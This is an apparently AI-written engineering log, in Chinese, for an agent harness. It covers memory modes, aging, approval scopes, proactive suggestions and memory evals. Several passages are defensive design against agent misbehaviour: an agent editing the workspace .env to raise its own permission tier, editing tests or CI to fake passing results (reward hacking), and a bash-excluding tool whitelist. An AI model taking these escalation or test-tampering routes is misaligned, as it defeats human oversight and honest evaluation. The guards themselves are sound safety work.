`HARNESS_LOAD_MEMORIES` / `HARNESS_MEMORY_RECALL` 都是进程级，没有「这次聊天别
记我」。Codex 的 chat-level `/memories` 明确说了 **不改全局设置**，这里照做。

四个模式两两控制读/写：

| 模式 | 用已有记忆 | 产生新记忆 |
|---|---|---|
| on（默认） | ✓ | ✓ |
| off | ✗ | ✗ |
| readonly | ✓ | ✗ |
| writeonly | ✗ | ✓ |

分开的理由：调试记忆功能时常需要"只读"（用已有但不污染它）或"只写"（一次性
引导会话，让它学习但不受旧记忆影响）。

**一个语义坑**：`HARNESS_MEMORY_RECALL=off` 历史上只关"读"、没关"写"，直接映射
会得到 `writeonly`（能学不读）——这显然不是用户想表达的。所以在 `_globals()` 里
把它归一成 `off`（读写都停），需要真正的只写请显式 `/memories writeonly`。
这个 bug 是被测试 `test_global_env_still_drives_default` 抓到的。

存储：ContextVar（热路径，每轮召回都读）+ 会话事件流（持久源，重启后仍生效）。
恢复走 `restore_from_session`，与 `tool_todos.restore` 同一套"取最后一次"语义；
恢复失败一律跟随全局默认——**不动状态比静默切成"不记"安全**。

命令：`/memories [on|off|readonly|writeonly]`，不带参数显示模式 + 记忆概况 +
归档情况。TUI 补 `CommandSpec('memories', ...)`。

### N2 老化与归档（src/memory_aging.py）

之前只有 `_MAX_MEMORY_ITEMS = 50` 的数量上界（超了**报错**，而报错的是用户、
模型只看到写入失败）。用一年后 50 条全是早期闲聊。

三个不照抄 Codex 的地方：

1. **不静默删除**——移到 `memories/.archive/`。我们有「不删除用户数据」的既有
   约束，淘汰也必须遵守。`/memories restore <文件名>` 可以找回。
2. **preference / correction 永不过期**——偏好不会因为三个月没提就失效，教训
   更是要一直记得。只淘汰 `fact` / `context`（这两类有时效性："部署走 X"改版
   后就错了）。
3. **不写回记忆文件**——记录"最后一次被召回"需要频繁写入，直接改 md 会不停
   扰动 mtime（而 mtime 正是老化依据）和前缀缓存。改用独立的
   `.recall-log.json`。

「多久没用」取 mtime 与召回记录的**较大者**：刚写过也算用过。召回记录损坏时
降级为「当作刚用过」——记录坏了不该导致删掉任何东西。

执行时机：`consolidate_memories()` 里**先老化再合并**，归档后可能已经低于阈值，
那就省一次模型调用。默认 90 天（Codex 是 30 天，我们放宽——单人记忆条数本来就
少，太激进会让人觉得"它把我说的忘了"）。

### 一个偶发失败的真正原因（不是 UI 时序）

全量跑到 47% 出现 1 个失败：`test_command_palette_filters_dispatches...`
断言搜 `mdl` 得到 2 项，实际 3 项。单独跑这几个文件全过——是因为**只有全量里
`memories` 命令才存在**（它是我这轮新加的）。

真正的匹配逻辑：`fuzzy_filter` 同时搜 name 和 description，而 `memories` 的描述
含 `readonly`，`mdl` 是 m→d→l 的子序列 → **合理匹配**，不是 bug。

修的是测试而不是代码：把 `assert options.option_count == 2` 改成"第 0 项是分组头
且 `model` 在列表里"，不再依赖具体命令集。

教训：硬编码「结果条数」的断言会在新增同类条目时必然失败，而失败原因与被测
功能无关。

### 验证

新增 `test_memory_scope.py` (21) + `test_memory_aging.py` (21)。
全量 **2429 passed / 3 skipped**（329s），ruff 通过。

## 第三轮实施：M4 可观察面 + M5 跨渠道接续 + M2 只读主动建议

按优先级 M4 → M5 → M2 落地。

### M4 记忆的审计事件

`AUDIT_EVENTS` 新增 7 类：`memory_written` / `memory_forgotten` /
`memory_redacted` / `memory_archived` / `memory_scope` / `proactive_suggested` /
`proactive_accepted`。

理由就是 TIME 那篇调查教的：**长期记忆不可观察会变成黑箱**。用户必须能回答
"它为什么记得这个"。所以写入、删除、脱敏、归档、模式切换全部留痕。

实现上统一走 `memory._audit()`（惰性导入 hooks），失败只静默——审计是观察层，
不能反过来影响一次写入。

### M5 跨渠道接续（src/session_continue.py）

原来：在 TUI 聊到一半，手机上发消息会**新建**会话，上下文断掉。

四个设计决定：

1. **只提供"最近活跃"，不改已有绑定**——接续只在"本来就要新建"时生效（绑定
   丢失 / 显式新建）。硬改会让人在两头同时操作时莫名跳会话。
2. **8 小时时间窗**——隔夜再发消息应该开新话题，而不是闯进昨天的对话。
3. **必须明说接的是哪个会话**：`已接续 3 小时前的会话「重构网关」`。
   静默接续比不接续更糟，用户会以为自己发错了地方。
4. **`/new` 不接续**——那是用户显式要求新会话。

复用 `session_store.session_summary()` 的 `updated` 字段（"最后一条对话消息的
时间戳，元数据和工具事件不推进它"），语义正好。

### M2 只读主动建议（src/proactive.py）——默认关闭

现在唯一的主动行为是 `heartbeat.py`，它明确写着**不跑模型**。所以"agent 自己
想到该做什么"并不存在。这里做最小版本。

**核心安全边界是白名单不是提示词**。`READ_ONLY_TOOLS` 12 个工具，明确排除：
`write`/`edit`/`apply_patch`/`delete_paths`/`web_fetch`/`remember`/`forget`/
`schedule_cron`/`spawn_teammate`/`desktop_action`/`clipboard_write`/
`screen_capture`。

**`bash` 整个排除**——它既能 `ls` 也能 `curl`，裁不出安全的子集。这是刻意的：
宁可少给能力，不可给一个"看起来只读"的复合工具。

为什么这一档不走审批：
> 主动回合是 agent 自己发起的，没人坐在那里等着点"同意"。把一个写操作变成一次
> 被打断的询问不叫安全，只是把代价转移给用户。

防骚扰：默认关（`HARNESS_PROACTIVE=1` 才开）、每天最多一次、**连续忽略 3 次
自动降频到每周一次**。降频是 `should_run` 的职责，不该让用户手动关。

`parse_suggestions` 处理了模型的自作主张：`- ` / `* ` / `• ` / `1. ` / `1) `
五种前缀都剥掉，`NONE`（大小写不敏感）返回空列表。

### 验证

- 新增 `test_session_continue.py` (20) + `test_proactive.py` (25)
- 全量 **2475 passed / 3 skipped**（194s），ruff 通过

## 第三轮实施：N7 审批作用域（2026-10-27）

### 问题

会话白名单原来是一个 set：`session_id|tool:klass`。批准一次 `rm`，这个会话里
所有同类 `rm` **永久免审**，直到手动 `/revoke`。没有时限、没有次数。

Muse 的说法是审批必须是**能力而不是建议**：

> Approvals ... are strict capabilities, not conversational suggestions. They're
> bound to the particular connector/destination and use case. Muse has support for
> obtaining one-time, session-scoped, task-scoped, time-bounded, or perpetual
> permission.

> If the recipient, amount, or affected resource changes afterward, require a new
> decision.

### 四个作用域

| 作用域 | 语义 | 落盘 |
|---|---|---|
| `once`（默认） | 只这一次 | 不写白名单，靠 `take_grant` 凭据传递 |
| `times` | 同类还能用 N 次 | 每次命中递减，归零即删 |
| `until` | 到时间戳为止（上限 12h） | 到期即删 |
| `session` | 本会话同类（旧的默认） | 同样 12h 硬上限 |

### 最重要的一个改动：默认从 session 变 once

用户点"同意"时心里想的是**眼前这一条**，不是"以后同类都免了"。把默认改成
`once`，让"多批一次"成为默认代价，而不是"少批一次"。

`HARNESS_APPROVAL_SCOPE=session` 可恢复旧行为。

### 实现要点

- `_session_allows` 从 `set[str]` 改成 `dict[str, dict]`，值是作用域记录。
- **在 `session_allows()` 里消费**，不在 `enforce` 里：命中一次就是"用掉一次"，
  次数型授权才能递减。过期/耗尽的记录当场 `pop`，不留死键位。
- `once` **不写白名单**：存了反而会让下一次命中。单次授权靠既有的
  `take_grant` 凭据传递机制。
- 会话档也有 12h 硬上限：`perpetual` 是 Muse 产品级的信任积累，我们不做——
  一个会话跑一整天已经很长，更长的授权应该重新确认。
- **撤销必须能收回所有作用域**：`revoke_session` 清的是整个 dict，不只是
  session 档。这是安全语义，不能因为作用域不同而漏。

### CLI 多一个选项

`y=仅这一次 / n=拒绝 / a=本会话允许同类 / t=允许 N 次`。`t` 的输入坏了就退回
`y`（宁可多问一次，不可超发授权）。

### 顺手修的两处测试腐烂

`test_approval_scope.py` / `test_execution_paths.py` 里有 9 处直接
`GATE._session_allows.add(...)` / `.update(...)`，数据结构变了之后全部 AttributeError。
改成构造 `approval_scope.make(...)` 记录。

**踩的坑**：用 heredoc 里的 `'\n'` 写替换文本时，字面反斜杠 + n 被写进了源码，
产生 `= \n   approval_scope.make(...)` 的语法错误。连试三种字符串写法都没匹配上
（因为 `'\n'` 在 Python 里是换行符，而文件里是两个字面字符）。最后落到
`chr(92) + 'n'` 才修好。教训：**涉及反斜杠的批量替换，先 `repr()` 看清实际内容**。

### 验证

新增 `test_scope_capability.py` (22)。全量 **2497 passed / 3 skipped**（255s），
ruff 通过。

手验：连续三次 `rm a/b/c` 各问一次（默认 once），确认默认行为已收紧。

## 第三轮收尾：文档补齐 + /status 补全（2026-10-27）

功能做完了，但发现一个真实问题：**本轮新增的 12 个环境变量一个都没写进文档**。
用户拿到代码后无法发现、配置或关闭这些开关——尤其 `HARNESS_NEVER_DO`、
`HARNESS_TAINT_EGRESS` 这类安全开关，找不到就等于只有默认值一条路。

### 新增 docs/ENVIRONMENT.md

全量扫了一遍 `src/` 和 `harness.py`，共 **79 个** `HARNESS_*` 变量，按 12 类分组
成表：安全与审批、记忆、主动性、跨渠道、桌面/屏幕/剪贴板、PowerShell worker、
资源限额、沙箱/凭据/浏览器、工作区/会话存储、模型与 provider、API/网关、调试/性能。

默认值不是猜的，逐个从实现里核（`getenv` 调用、模块常量）。标「**安全**」的那些
建议保持默认，关掉通常是排查事故而不是日常配置。

末尾给了三组常见组合：最安全一档、日常默认、排查事故临时关某项。

### README 补四处

1. **工具清单**加入 `remember`/`forget`/`recall`。
2. **新增「记忆」章节**：自动一半（每回合后台抽取 + 本地召回，作为请求末尾的
   独立 system 消息而不是进 system prompt，否则会作废前缀缓存）+ 显式一半
   （三个工具）+ 三个保障（落盘脱敏、老化归档、逐会话开关）。
3. **执行安全与审批**新增三小节：
   - 授权的作用域与时限（once/times/until/session，默认 once 的理由）
   - 不可代做的事（第四档，四条"不看什么"）
   - 外部内容与污点出网（为什么是跨命令的缺口、三个设计约束）
4. **审批通道**补上 `t`（允许同类 N 次）和 `y` 的新语义（仅这一次）。

### /status 补三行

之前只加了「不可代做 / 外部内容标记 / 污点出网」，缺审批作用域、记忆模式、跨渠道
接续。这三项用户最该一眼看到——它们决定了「批准一次管多久」「它在不在学我」
「为什么手机上的消息接上了昨天的对话」。

### 验证

- 12 个新环境变量全部在 docs/ENVIRONMENT.md 中有记录（脚本核对）
- 文档内链检查：本轮新增的引用无失效（既有的 75 条 `[x](y.py)` 是把代码名
  当行内代码用的历史风格，不是这一轮引入的）
- 全量 **2497 passed / 3 skipped**（188s），ruff 通过

### 收尾第二件事：补 conftest 的状态隔离

本轮新增模块里有模块级可变状态的两个：`taint`（本回合读过什么）和
`memory_scope`（本会话记忆模式）。两者都是 `ContextVar`——比全局变量好（线程间
不串），但**同一测试线程里的用例之间照样残留**。

这正是之前 `turn_coordinator._DEPTH/_OWNER/_UNLOCK` 那次「单跑必过、连跑偶发」
失败的同一类问题：上一个用例留下的污点会让下一个用例的普通出网无故升级；
`memory_scope` 留着 readonly/off，会让别的用例的抽取测试静默不跑（断言"没调用
模型"的用例会假通过）。

加了 `_reset_third_round_state` autouse fixture，前后都清。

**验证方式**（不是"看着对"，是实际构造残留）：临时写一个两用例的探针文件，
第一个故意 `taint.mark()` + `set_mode('off')`，第二个断言自己是干净的。没有
fixture 时第二个会失败；加完之后 2 passed。探针用完即删。

全量 **2497 passed / 3 skipped**（170s），ruff 通过。

## 架构复查：分层与配置（2026-10-27）

用户提出两个问题：分层做好了吗？参数该不该统一到 config/yaml？

### 分层：设计对，但没有用目录表达

`src/` 下 151 个 `.py` 平铺，只有 `ui/` 一个包。靠文件名前缀（`tool_` 20 个、
`feishu_` 11、`api_` 11、`session_` 7、`turn_` 6）暗示归属。

写脚本解析了 151 个文件的 import 图，算依赖深度：

| 底层（被依赖） | 次数 | | 顶层（依赖多） | 出边 |
|---|---|---|---|---|
| `paths` | 16 | | `feishu_gateway` | 32 |
| `exec_policy` | 16 | | `status_report` | 22 |
| `turn_progress` | 11 | | `harness_api` | 19 |
| `hooks` | 11 | | `tools` | 18 |

底层是路径/策略/存储这类纯原语，顶层是网关/UI/入口——**语义分层是对的**，缺的
只是物理表达。

但有 7 对循环依赖，其中 **`hooks <-> tools` 是真实痛点**：这轮加记忆工具时踩到了
（`tools` → `tool_tasks` → `hooks` → `from tools import tool_registry` → 还没执行到
赋值 → ImportError）。这种"靠 import 顺序碰巧能跑"的结构，每次新增工具都可能再踩。

另外 `docs/coding-standards.md` 明文写"`src/` 模块不 import harness"，实际 26 个
文件经 `llm_route.harness()` 这个"合法后门"反向读入口全局。**规范与实际不一致**比
规范宽松更糟——新代码会照抄后门。

### 配置：不建议做统一 yaml，三条硬约束

1. **安全档位必须只认进程启动环境**：项目根的 `.env` 就在工作区里，`write` 在默认档
   免审，Agent 改一行就能把下次启动的权限降到 `never`。`harness.py` 开头的
   `_TRUSTED_POLICY_ENV` 快照就是防这个。档位写进工作区 yaml = 提权路径。
2. **换档必须即时生效**：`/sandbox` 靠 `set_tier()` 写 `os.environ`、`load_policy()`
   即读即用。任何"启动加载一次配置对象"都会破坏它。
3. **参数在调用时读取**：实测 138 处 `os.getenv`，**只有 2 处**是模块级常量
   （`api_streams.STREAM_PROGRESS_INTERVAL`、`feishu_gateway.BINDINGS_PATH`），
   其余全在函数体内。缓存则破坏约束 2，不缓存则没省什么。

结论：现在做统一配置是负收益。真正的痛点不是"参数散"，而是"没有地方问这个参数
是什么、默认多少"——那个已经有了（`docs/ENVIRONMENT.md`）。

### 做了的事：`src/settings.py` 收敛读取点

不改机制，只改读取方式：

```python
settings.flag(name, default)        # 布尔，非法值回落到 default
settings.number(name, default, minimum=…, maximum=…)  # 越界收敛到边界
settings.text(name, default)        # 空串等于未设
settings.csv(name)                  # 逗号/分号，去重保序
settings.policy_env(name)           # 只读，且只接受三个档位键
```

三个设计决定：

- **不缓存**：每次调用都读环境。比 dict 查找慢几微秒，但保住"改完下一条调用就生效"。
- **非法值回落而不报错**：配置写错不该让一次已批准的操作失败。
- **`policy_env` 只读且只收三个键**：刻意没有 setter——绕过 `set_tier` 或启动环境
  改档位等于提权。有测试断言 `dir(settings)` 里不存在 `set_policy`/`set_tier`。

迁移了 7 个本轮新模块（`never_do`/`untrusted`/`taint`/`memory_redact`/`proactive`/
`session_continue`/`memory_aging`），它们原本各自重复 `not in ('0','off','false','no')`。
行为完全不变（156 条相关测试全过）。

**没做**：没有一次性改完 138 处调用点。按"新参数一律走 settings、旧参数动到时顺手改"
渐进迁移，避免大规模回归风险。

### 没做的：src/ 分子包

按前缀分 `core/policy/storage/tools/transport` 会把 151 个文件的 import 路径全改掉，
`tests/` 里大量 `monkeypatch.setattr('src.xxx')` 失效。按之前"正则批量改测试文件一次
改坏 6 处"的教训，这个动作需要机械可验证的做法。**收益主要是观感，代价是高风险
回归**，判定现在不值得。

### 验证

- 新增 `test_settings.py` (34)，含一条契约测试：`settings.flag` 与各模块自己的
  `enabled()` 必须给出同一个答案（防止两层漂移）
- 全量 **2531 passed / 3 skipped**（165s），ruff 通过
- 新增 `docs/ARCHITECTURE_REVIEW.md` 记录完整诊断与建议

## 架构整理：解开顶层循环依赖 + 规范对齐（2026-10-27）

按 ARCHITECTURE_REVIEW.md 的优先级做前两项。

### 1. 解开 `hooks <-> tools` 循环

关键发现：`hooks` 从 `tools` 取 `PatchError`/`patch_paths`，而这两个**实际定义在
`tool_patch.py`**，`tools` 只是 `# noqa: F401` 转发。绕这一道纯属历史遗留。

改法两步：

1. `hooks` 直连 `from tool_patch import PatchError, patch_paths` — 循环断一半。
2. `tool_registry` 只剩 `is_tool_hook` 用一处，改成调用期惰性 `import tools`。

结果：**模块顶层 import 的循环依赖为 0**（之前 7 对，其中 6 对是函数体内惰性导入、
不影响顶层顺序）。更重要的一条：**`import tools` 现在能独立成功**——原来它是最容易
炸的那一端（本轮加记忆工具时就炸在这里）。

### 2. 规范与实现对齐

`coding-standards.md` 原来写"`src/` 模块不 import harness"，实际 26 个模块经
`llm_route.harness()` 反向取。选择**承认后门**而不是去掉它（去掉会破坏大量测试的
monkeypatch 方式，收益不抵成本）。

改写成一张明确的允许/禁止表：

| 允许 | 禁止 |
|---|---|
| 函数体内 `llm_route.harness()` | 模块顶层 `import harness` |
| 读可变配置（目录/client/黑名单） | 在 harness 里回调 src 私有函数 |
| 测试 `monkeypatch.setattr(harness, ...)` | 新模块默认照抄后门 |
| 入口适配层（`headless.py`）顶层 import | 原语层这么做 |

并写清新代码优先级：**参数注入 → `llm_route.harness()` → 才考虑顶层 import**。

唯一顶层例外是 `headless.py`：它是入口适配层（`entrypoint.py` 的
`from headless import run` 调它），职责上属于入口，放 `src/` 只是为了跟其它传输层
放一起。已在规范和测试里都标注。

### 3. 新增架构守卫测试（tests/test_architecture.py, 8 条）

- `test_no_module_level_import_cycles`：顶层 import 必须无环
- `test_tools_and_hooks_import_independently`：两个模块各自都能先导入
- `test_registry_check_does_not_need_top_level_tools`
- `test_settings_is_a_leaf_module`：配置层必须零依赖
- `test_low_level_utils_stay_low`：`paths`/`file_lock`/`console` 不能依赖策略层
- `test_only_entry_adapters_import_harness_at_module_level`

### 踩到的坑：守卫测试自己制造了跨用例污染

第一版 `test_tools_and_hooks_import_independently` 用 `sys.modules.pop('hooks')`
来测"先导入谁"。结果全量出现 **12 个失败**，全是别的文件的：

```
tools.run_web_fetch(...) 期望 'Permission denied by user'
实际 'Permission denied: approval timed out after 3s'
```

原因：`sys.modules.pop` 把模块对象从字典里拿掉，别处（`monkeypatch.setattr(hooks,
...)` 打桩、`tools._gate()` 返回的引用）持有的旧对象与新建的不是同一个 —— 打桩打到
旧对象上，真实对象没被打桩，于是走了真审批并超时。

**这正是本仓反复出现的"跨用例全局状态泄漏"**，只不过这次是我自己写的守卫测试造成的。
修法：改用**子进程**测真实的"先导入谁"，主进程模块表不受影响。

教训：**测试里不要 `sys.modules.pop` 已导入的项目模块**——`monkeypatch` 打桩、
模块级缓存都持有对象引用，pop 之后它们指向的是孤儿。

### 验证

全量 **2539 passed / 3 skipped**（291s），ruff 通过。

## 调研 + 实现：越用越懂人（D1/D2/D4）（2026-10-28）

调研了 Codex/dots/Muse 加上 PAHF 论文与 RSI 领域综述，写成
`docs/AGENT_LEARNING_AND_RSI.md`。核心区分：**「越用越懂人」是学习，
「RSI」是改变系统**，两者常被混为一谈。

### 最重要的发现：我们缺 post-action 反馈通道

PAHF（arXiv 2602.16173）的结论：

> The final and most critical step is Post-Action Feedback Integration. This
> reactive loop is the essential mechanism for correcting miscalibrated beliefs
> and adapting to non-stationarity, **which pre-action queries alone cannot solve**.

论文的例子：Day 1 记「Kate 喜欢可乐」；Day 2 她困了、送可乐、她说「我困的时候
更想喝茶」。**只有第三条能纠正记忆**——只记「喜欢可乐」会永久错。

查我们的 `extract_memories`：只拼对话文本（`f'{role}: {content}'`），工具结果
虽在 messages 里但**没有和"用户随后说了什么"配对**。三个缺口：

- A 没有 post-action 通道（不看工具做了什么、用户反应如何）
- B `correction` 没有覆盖语义（会和旧记忆并存，召回可能取到错的）
- C 条件性偏好没有表达（「困了喝茶」只能写成一句话，靠关键词碰）

### D1 新增 memory_feedback.py

纯本地、零模型调用的信号提炼，产出提示拼进抽取提示词（不直接写记忆——避免两处
都在判断"什么值得记"）。

五类信号：`correction`（明确否定）、`refine`（补充条件）、`rewrite`（用户改了模型
刚写的文件）、`failure`（工具报错）、`approval`（认可，低权重）。

**两个必须记的坑**（都是写完自测才发现的）：

1. **PAHF 的核心例子没识别出来**。第一版只匹配否定词，「我困的时候更想喝茶」
   不含任何否定词 → 漏掉。加 `REFINE_PATTERNS`（的时候/的话/更想/还是用/下次…）
   和独立的 `refine` 类型，专门处理"不是否定而是收窄"。

2. **正反馈用前缀匹配造成误判**。「好主意」「可以吗」「好的话说回来…」全被判成
   approval。改成**整句匹配**（去掉末尾标点/语气词后整体比对，或逗号分句全在名单
   内）。前缀匹配在这里是错的：中文的「好」可以是评价、疑问、转折的开头。

### D2 合并规则补两条

- `correction` 永远赢：与旧的 `user` 记忆冲突时**删旧留新**，不能并存——一条错误
  假设和它的修正在一起，召回可能取到错的那个。
- 条件性偏好不算矛盾：「困了喝茶」和「喜欢可乐」可以共存，但**永远不许丢掉条件**。

### D4 记忆来源（防黑箱）

TIME 那篇调查批评 Muse 每小时建用户档案且不告知。我们的对策：写下时存
`source_session` + `source_quote`（用户原话，同样过脱敏 + 单行 + 限长 200 字），
`/memories why <名字>` 回答「为什么记这个」。查不到来源的旧记忆会明说
「早期写入或自动抽取，没有留下原话」，而不是假装有。

### 关于 RSI：明确只做第二层

Phil Schmid 的三层定义：
- **Iteration**：改代码跑测试，系统不变
- **Self-improvement**：加工具/记技能，系统变了、尺子不变
- **Recursive**：连尺子一起抬高，且仍改不动那个尺子

> A rising score proves self-improvement. Recursion is a claim about whether the
> next round faces a harder, still-honest bar.

**公开系统没有做到第三层**，而且：

> The moment the system owns the ruler, it will get very good at looking improved.
> RSI without taste is a faster way to optimize the wrong thing.

实测我们的位置：技能只读（有 scan/load，无 write 工具）、无 Python 扩展动态加载、
`SKILLS_DIR` 在工作区内（技术上 agent 能写）、**评估器是 2575 条 pytest，agent
改不到**——这恰好是 RSI 公认唯一能安全改进的前提。

因此设计上只做第二层（S1 技能自建需审批、S2 自改进需验证、S3 审计+回滚、
S4 不自动提交 git），明确不做第三层（agent 改策略/审批代码、改 tests、自动加载
可执行插件、自己抬高标准）。**S 系列整体后置**：自改进的价值取决于"能判断改得
对不对"，而我们现在只有一个粗糙的评估器，先积累"什么记忆真的有帮助"的数据。

### 验证

新增 `test_memory_feedback.py` (36)。全量 **2575 passed / 3 skipped**（167s），
ruff 通过。

## 偏好学习与 RSI：完整设计方案（2026-10-28）

深挖 PAHF 原文、EvoMemBench（FAMA）、RSI 研究地图与本机 autoresearch skill，
写成 `docs/PERSONAL_AGENT_LEARNING_RSI_DESIGN.md`（架构 + 实现方法 + 阶段计划）。

### 一手材料里的关键结论

**PAHF（arXiv 2602.16173）** —— 记忆条目是 `{text, last_update_date, keywords}`
+ embedding；API 只有 add / retrieve top-k / **near-duplicate 检测决定 update vs add**；
**两层**（session notes 合并后清除 → global 只留 durable）；合并时**冲突按
last_update_date 取最新**。它给的例子很关键：一趟旅行说"这次不想托运"被
**故意丢弃**，因为 explicitly scoped to that specific trip。

另一条直击我们的痛处：

> Without careful pruning, memory stores will accumulate redundant and outdated
> information, **degrading agent quality over time**.

**EvoMemBench（arXiv 2605.18421）** —— FAMA 指标：
`max(0, MPA − λ·(1−FAA))`，λ = N_forget/(N_presence+N_forget)。
「Failure to Forget」是主要问题，agent 必须 "forgetting-aware"。
只测"记住没有"会奖励"什么都记"。

**PAHF 的 injection eval** 里有一项 `over-influence`：记忆是否错误覆盖了当前
用户意图。**我们正好踩中**（见下）。

### 对照出的 8 个缺口

| 维度 | 我们 | PAHF |
|---|---|---|
| 条目字段 | name/description/type/source_* | + last_update_date / keywords / embedding |
| 检索依据 | 只对 name+description 打分 | 全文 dense retrieval |
| 作用域 | session 与 global 混在一起 | 两段，中间有 durability 判定 |
| 写入策略 | 同名覆盖 | near-duplicate → update vs add |
| 冲突 | LLM 自行决定 | 按 last_update_date 取最新 |
| 剪枝 | 50 条上限 + 90 天 | stale / overwritten / low-signal |
| 注入位置 | **请求末尾（用户消息之后）** | — |
| 评估 | 无 | precision / recall / safety / recency / over-influence |

实测我们 20 条记忆：project 13、user 5、feedback 1、reference 1。
**65% 是 project 类**——按 durability 原则这正是最容易过时的一类，而它们都没有
时间戳。

### RSI：三层定义与我们的位置

| 层 | 系统 | 尺子 |
|---|---|---|
| Iteration | 不变 | 不变 |
| Self-improvement | 变 | 不变 |
| Recursive | 变 | **也抬高，且仍改不动** |

> The moment the system owns the ruler, it will get very good at **looking** improved.

公开系统无第三层。我们定位第二层，因为**评估器（2615 条 pytest）诚实且
agent 改不到**——这恰是 RSI 公认唯一能安全改进的前提；但**没有 taste**，
而抬标准需要 taste。

### 设计要点：三环分离

- **Ring 0 不可变**：exec_policy / 审批链 / never_do / POLICY_KEYS / **tests/**
- **Ring 1 需审批**：skills/*.md、AGENTS.md
- **Ring 2 自由**：记忆、会话、任务、工作区文件

核心原则：**谁都能改，唯独改尺子的那条路必须是死路。**

### 已实现两项（优先级最高、风险最低）

**A1 召回优先级声明**（一句话，修真实风险）
`inject_memories` 把记忆块追加在用户消息**之后**（为保前缀缓存），而模型对末尾
内容权重高 → 旧偏好可能压过当轮指令。加首行声明：

> Priority: the user's latest message always overrides these notes when they
> conflict.

不动位置（移走会作废整个前缀缓存），只降优先级。

**B1 verifier_guard（评估器保护）**
把 tests / CI / lint 配置归入第四档（MUST_DO_SELF）：改测试、改 `.github/workflows`、
改 `conftest.py`/`pytest.ini`/`ruff.toml` 一律硬拒，不看档位、不问人、不进队列。

理由不是"别乱动用户文件"，而是：**一旦 agent 能改测试，"pytest 全绿"就不再是
证据**——它可以删失败用例、放宽断言，然后"证明"自己变好了。这是奖励作弊的教科书
路径，也是 RSI 的第一条红线。

**一处刻意的精度取舍**：`test_*.py` 文件名模式只在测试目录内或仓库根生效。本仓
`testpaths = tests`，全仓型号会把 `src/test_helpers.py` 这类非测试文件也硬拒，
反而阻碍正常工作。有测试守住这条边界。

### 评估缺失是最大的短板

按 PAHF 的 eval 框架，记忆质量要测：Precision（只存 durable）、Recall、
Safety、Recency correctness、Over-influence、Token efficiency。我们一条都没有。

**因此文档里写死一个判断：Part A 的评估集没建起来之前，Part B（自改进）不该启动。**
否则 RSI 会优化一个我们自己都测不准的东西。

### 阶段顺序

A1（注入声明）→ **B1（verifier_guard）** → A2（schema v2）→ **B4（评估集）** →
A4（写入策略）→ A3（检索改进）→ A5（两层作用域）→ A6（低信号剪枝）→
B2（改动台账+回滚）→ B3（self_improve 循环）

B2/B3 放最后：没有 A 的数据，自改进就是无源之水。

### 验证

新增 `test_verifier_guard.py` (40) + `test_memory_injection.py` (2)。
全量 **2615 passed / 3 skipped**（200s），ruff 通过。

## 实施 A2（schema v2）+ B4（记忆评估集）+ A3 召回改进

### 顺手修掉一个真 bug：类型词表分裂

核对 schema 时发现 M1 留下的缺陷：

- `remember` 工具写入语义类型 `preference`/`correction`/`fact`/`context`
- 合并校验用的是旧词表 `MEMORY_TYPES = ['user','feedback','project','reference']`
- 后果：**用户一旦用过 `remember`，后续每次合并都整批校验失败并被静默跳过**
  （`[memory] skipped`）。实测确认四种新类型全部 REJECTED。

修法：`memory_schema` 做双向归一（`LEGACY_ALIASES`），`harness.MEMORY_TYPES`
改成规范四词。旧文件继续可读，磁盘上不再新写旧词。

**区分了宽容与严格两个入口**（重要）：

- `normalize_type()` —— 读取路径，未知类型回落 `fact`（一个字段写坏不该让整批
  记忆不可读）
- `canonical_type(strict=True)` —— 合并校验，未知类型**必须报错**

为什么合并必须严格：合并会**删旧文件**。把一个格式错误的 LLM 输出静默当成
`fact` 落盘，等于用错数据换掉正确数据。既有测试
`test_invalid_consolidation_keeps_existing_memories` 正是守这条，它先失败了一次
——说明原来的断言是对的，我的第一版归一太松。

### A2 schema v2

新增字段：`scope` / `keywords` / `confidence` / `last_update_date` /
`supersedes` / `superseded_by`。全部有默认值，旧文件照常读。

**`keywords` 而不是 embedding**：召回是本地关键词匹配（零网络往返，省 ~2s/轮）。
embedding 要么每次调 API（违反本地优先），要么本地跑模型（依赖重）。`keywords`
由写入时顺手产出、成本为零，且让正文里的词参与检索——直接解决"条件偏好的关键词
写在正文、名字里没有就召回不到"。将来真要向量检索，它就是现成的稀疏索引。

**`last_update_date` 为什么必须显式**：原来靠文件 mtime，但召回记录写在独立 json
里以避免扰动 mtime，一旦要"哪条最新"的确定性排序就不可靠。

### 踩到一个会静默毁数据的坑：冒号破坏 YAML

PAHF 推荐的条件偏好写法就是 `when sleepy: prefers tea`——**里面带 `: `**。
直接写进 `description:` 会让 YAML 报 "mapping values are not allowed here"，
**整个 frontmatter 变成空映射**，于是 type 回落成 fact、scope/keywords/
last_update_date 全丢。

实测才发现（渲染出的文件看着很正常，读回来 type 变成了 `fact`）。修法：加
`_yaml_scalar()`，仅在必要时加双引号（含 `: `、` #`、以特殊字符开头、会被当布尔
的字面量），普通值保持不加引号以保证 diff 干净。

这个坑很值得记：**推荐的写法恰好是存储层的破格式**。

### B4 记忆评估集（tests/test_memory_eval.py）

按 PAHF 的 eval 框架建场景回归，不是单点断言：

| 组 | 用例 |
|---|---|
| Precision | durable 偏好保留；session 笔记必须标 scope=session |
| Recall | 条件偏好按**条件词**召回；无关记忆不召回 |
| Recency | 同主题两条时 last_update_date 新者在前 |
| **FAMA** | 被 superseded 的记忆必须退出召回（文件仍保留） |
| Over-influence | 记忆块必须声明当轮指令优先，且声明在正文之前 |
| Safety | 密钥落盘前脱敏 |
| Token | 召回条数有上限 |

### A3 召回改进

- 打分字段 `name + description` → `+ keywords`
- `correction` 类 ×1.3
- 时间衰减：每 30 天 ×0.9（旧记忆排后但不消失）

### 验证

新增 `test_memory_schema.py` (42) + `test_memory_eval.py` (13)。
全量 **2672 passed / 3 skipped**（160s），ruff 通过。

## 实施 A4：写入策略 ADD / UPDATE / SUPERSEDE

### 设计

写入前先判定，不再盲目按文件名覆盖：

- **ADD** 没有相近的 → 新建
- **UPDATE** 同一个文件（同名）或描述完全相同且相似度 ≥0.8 → 写进已有文件，
  保留 name/filename，关键词取并集
- **SUPERSEDE** 显式点名（`supersedes`）或中等相似 + 类型是 `correction` →
  新建并让旧的退出召回（归档，不删除）

### 为什么 SUPERSEDE 主要靠显式点名而不是相似度

一条修正和它纠正的错误内容，**措辞本来就会变**，字面相似度往往不高。实测：
`deploy by running script.sh` 与其修正只到 0.44，达不到阈值。

抽取提示词里本来就有现有记忆清单，让模型直接指认"我修正了哪一条"比猜准得多。
所以 `write_memory_file(supersedes=...)` 优先于相似度，相似度只作兜底。

### 踩了四个坑，都是实测出来的

**坑 1：UPDATE 阈值不可达。** 最初的相似度权重是关键词 0.6 / 名字 0.3 / 描述 0.1。
